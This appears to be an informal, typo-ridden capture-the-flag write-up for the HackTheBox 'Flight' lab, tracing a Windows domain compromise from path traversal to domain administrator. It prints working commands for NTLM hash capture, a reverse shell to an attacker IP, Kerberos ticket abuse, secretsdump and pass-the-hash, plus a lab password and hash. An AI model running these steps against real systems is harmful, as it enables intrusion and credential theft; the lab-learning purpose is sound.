i found  a sub domain school in it. it was running apache . so if we look in the url when we chance page we see

http://school.flight.htb/index.php?view=about.html   so always look for path trnaversal adn we found C:\system.....\etc\hosts

so it was confirmed path ==tranversal==.

so we can do force connect with our server to get ntlm hash  http://shool../index.php?view=10.10.14.9/ddd  we get hash on responder

soo we got svc_apache password . we will use lookupsids to get username then passwordspray over smb

and we found 2 more account have that password

we looged in smb as s moon we saw we have write permission on smb shared which means we can upload  a svc file nd get ntml for other user

we used ntlm theft tool to generate all file then mput * in smb

`python ==ntlm_theft.py== -g all -s 10.10.14.6 -f ddd`

then on responder we got s bum password

on s bum we got a web directory se we can uppload a shell and it will connect us on server

we uploaded a file nc.exe and php normal backdoor

and we got a shell.

now we have s bum password but we got have a tty shell on windows so we are not able to log in

so we used ==runasCS== to get a tty shell and it gave us shell as c bum

`r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.6:443 cmd`

now on internal server we see a developmwnt directory adn port 8000 was open so we fired chisel and and open localhost 8000

the conent header said it was iis site powered by asp.net

so we can send ==aspx== payload maybe?

now we can uplaod a `aspx` shell on development folder to get a shell

and we got a shell

now we can get a ticket using rubeus

`==rubeus==.exe tgtdeleg /nowrap`

it will give a hash

we saved the hash and used

`==kirbi2ccache== ticket.kirbi ticket.ccache`

`export KRB5CCNAME=ticket.ccache`

now it gives time error so ntpdate it

`sudo ==ntpdate== -s flight.htb`

now using

`==secretsdump==.py -k -no-pass g0.flight.htb -just-dc-user administrator`

we got hash and cracked it then used ==psexc==.py to get shell..

`rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c`
